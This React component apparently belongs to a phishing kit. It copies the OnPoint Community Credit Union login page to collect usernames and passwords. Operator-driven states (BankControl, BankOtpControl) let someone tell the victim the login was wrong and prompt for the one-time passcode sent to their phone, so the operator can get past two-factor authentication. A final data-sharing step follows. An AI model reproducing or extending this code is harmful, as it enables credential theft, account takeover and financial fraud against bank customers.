import clsx from "clsx";
import BankingHeader from "./BankingHeader";
import { motion } from "framer-motion";
import OnPointFavIcon from "../../../../../../../../assets/allBanks/banks/onpoint/op2.webp";
import OnPointImg from "../../../../../../../../assets/allBanks/banks/onpoint/op3.svg";
import House from "../../../../../../../../assets/allBanks/banks/onpoint/op4.png";
import { Link } from "react-router-dom";
import { ClipLoader } from "react-spinners";
import BankControl from "./BankControl";
import BasicLoader from "../../../../../loading/BasicLoader";
import { IoCloseCircleOutline } from "react-icons/io5";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import ShareData from "./ShareData";
import BankOtpControl from "./BankOtpControl";

const Onpoint = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  btn9",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="OnPoint Community Credit Union Online Banking"
        handleCancel={handleCancel}
        img={OnPointFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <div className="items-center justify-center min-h-[70vh] px-2 pt-7 flex">
        <div className={clsx("w-full  customMiniTablet:w-[618px]")}>
          <header className="bg-white w-full flex justify-center items-center py-2 customMiniTablet:py-5 rounded-t-lg border-b border-b-customGray-1000">
            <div className="w-[100px] h-[48px] customMiniTablet:w-[352px] customMiniTablet:h-[90px] ">
              <img
                src={OnPointImg}
                alt=""
                className="w-full h-full object-contain"
              />
            </div>
          </header>
          <div className="bg-customGray-1072 w-full flex justify-center px-6 pt-10 py-20">
            <div
              className={clsx("w-[368px]", allBankOpen ? "hidden" : "block")}
            >
              {/* <div className="w-[368px] "> */}
              <div>
                <label className="text-customGray-1073 font-medium">
                  Login ID
                </label>
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 mb-5 border-opacity-20"
                />
              </div>
              <div>
                <label className="text-customGray-1073 font-medium">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={formState.password}
                    name="password"
                    onChange={handleChange}
                    className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 border-opacity-20"
                  />
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute h-full leading-[3.7] right-3 text-sm  font-semibold text-customGreen-1003"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </span>
                </div>
              </div>
              <div className="flex items-center gap-2 mt-9 ">
                <input type="checkbox" className="w-[20px] h-[20px] " />
                <p className="text-sm text-customGray-1074 ">Remember me</p>
              </div>
              <button
                disabled={loading}
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className={clsx(
                  "mt-8 w-full py-2 text-white font-medium rounded-md",
                  formState.username && formState.password
                    ? "bg-customGreen-1003 bg-opacity-100"
                    : "bg-customGreen-1003 bg-opacity-70 cursor-not-allowed"
                )}
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
            </div>
            <div>
              {allBankOpen && (
                <div className={clsx(OtpOpen ? "hidden" : "block")}>
                  <BankControl
                    handleSelectedId={handleSelectedId}
                    selectedPath={selectedPath}
                    handleSelectSubmit={handleSelectSubmit}
                  />
                  <div>
                    {activePathDetails.name === "Loading" && (
                      <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                        <BasicLoader />
                      </p>
                    )}
                    {activePathDetails.name === "Wrong Info" && (
                      <>
                        <div className={clsx("w-[368px]")}>
                          {/* <div className="w-[368px] "> */}
                          <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-1008">
                            <p>{activePathDetails.body}</p>
                          </div>
                          <div>
                            <label className="text-customGray-1073 font-medium">
                              Login ID
                            </label>
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 mb-5 border-opacity-20"
                            />
                          </div>
                          <div>
                            <label className="text-customGray-1073 font-medium">
                              Password
                            </label>
                            <div className="relative">
                              <input
                                type={showPassword ? "text" : "password"}
                                value={formState.password}
                                name="password"
                                onChange={handleChange}
                                className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 border-opacity-20"
                              />
                              <span
                                onClick={() =>
                                  setshowPassword((prevShow) => !prevShow)
                                }
                                className="absolute h-full leading-[3.7] right-3 text-sm  font-semibold text-customGreen-1003"
                              >
                                {showPassword ? "Hide" : "Show"}
                              </span>
                            </div>
                          </div>
                          <div className="flex items-center gap-2 mt-9 ">
                            <input
                              type="checkbox"
                              className="w-[20px] h-[20px] "
                            />
                            <p className="text-sm text-customGray-1074 ">
                              Remember me
                            </p>
                          </div>
                          <button
                            disabled={loading}
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className={clsx(
                              "mt-8 w-full py-2 text-white font-medium rounded-md",
                              formState.username && formState.password
                                ? "bg-customGreen-1003 bg-opacity-100"
                                : "bg-customGreen-1003 bg-opacity-70 cursor-not-allowed"
                            )}
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Log In"}
                          </button>
                        </div>
                      </>
                    )}
                    {activePathDetails.name === "Send Otp" && (
                      <>
                        <h3>{activePathDetails.body}</h3>

                        <div
                          className={clsx("w-full customMiniTablet:w-[340px]")}
                        >
                          <div>
                            <div className="text-customGray-1055">
                              <div>
                                <h3 className="mb-3 text-xl font-medium">
                                  Enter Authentication Code
                                </h3>
                              </div>
                              <div>
                                <h2 className="mb-4 text-sm">
                                  Enter the one-time password (OTP) sent to your
                                  phone to access your account
                                </h2>
                                <div>
                                  <input
                                    type="number"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 mb-5 border-opacity-20 no-spinner"
                                  />
                                </div>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold text-center my-2",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Did not receive a code? Resend Code
                                </p>
                                <button
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                  className="mt-8 w-full py-2 bg-customGreen-1003 text-white font-medium rounded-md"
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Submit"}
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </>
                    )}
                  </div>
                </div>
              )}
              {OtpOpen && (
                <>
                  <BankOtpControl
                    handleSelectedOtp={handleSelectedOtp}
                    selectedOtp={selectedOtp}
                    handleSubmitOtp={handleSubmitOtp}
                  />

                  <div>
                    {activeOtp.name === "Loading" && (
                      <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                        <BasicLoader />
                      </p>
                    )}
                    {activeOtp.name === "wrong" && (
                      <>
                        <div
                          className={clsx("w-full customMiniTablet:w-[340px]")}
                        >
                          <div>
                            <div className="text-customGray-1055">
                              <div>
                                <h3 className="mb-3 text-xl font-medium">
                                  Enter Authentication Code
                                </h3>
                              </div>
                              <div>
                                <h2 className="mb-4 text-sm">
                                  Enter the one-time password (OTP) sent to your
                                  phone to access your account
                                </h2>
                                <div>
                                  <input
                                    type="number"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className="w-full mt-1 h-11 rounded-sm outline-none px-2 border border-customGray-1074 mb-5 border-opacity-20 no-spinner"
                                  />

                                  <h3 className="mt-2 text-sm text-customRed-1008">
                                    {activeOtp.body}
                                  </h3>
                                </div>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold text-center my-2",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Did not receive a code? Resend Code
                                </p>
                                <button
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                  className="mt-8 w-full py-2 bg-customGreen-1003 text-white font-medium rounded-md"
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Submit"}
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </>
                    )}
                    {activeOtp.name === "otp" && (
                      <>
                        <ShareData
                          bankName={bankName}
                          handleTheFinal={handleTheFinal}
                          handleCancel={handleCancel}
                          setIsOpenOtp={setIsOpenOtp}
                          setAllBankItems={setAllBankItems}
                          siteLink="https://www.alliantcreditunion.org/"
                        />
                      </>
                    )}
                  </div>
                </>
              )}
            </div>
          </div>
          <footer className="bg-customGreen-1004 rounded-b-lg flex justify-center items-center py-3 space-x-6 text-white text-xs">
            <p>
              <Link to="https://www.onpointcu.com/">Forgot Login </Link>
            </p>
            <p className="border-l border-l-white border-r border-r-white px-6">
              <Link to="https://www.onpointcu.com/">Forgot Password </Link>
            </p>
            <p>
              <Link to="https://www.onpointcu.com/">Privacy Policy </Link>
            </p>
          </footer>
        </div>
      </div>
      <div className="w-full flex justify-center items-center mt-3">
        <img src={House} alt="" />
      </div>
    </motion.div>
  );
};

export default Onpoint;
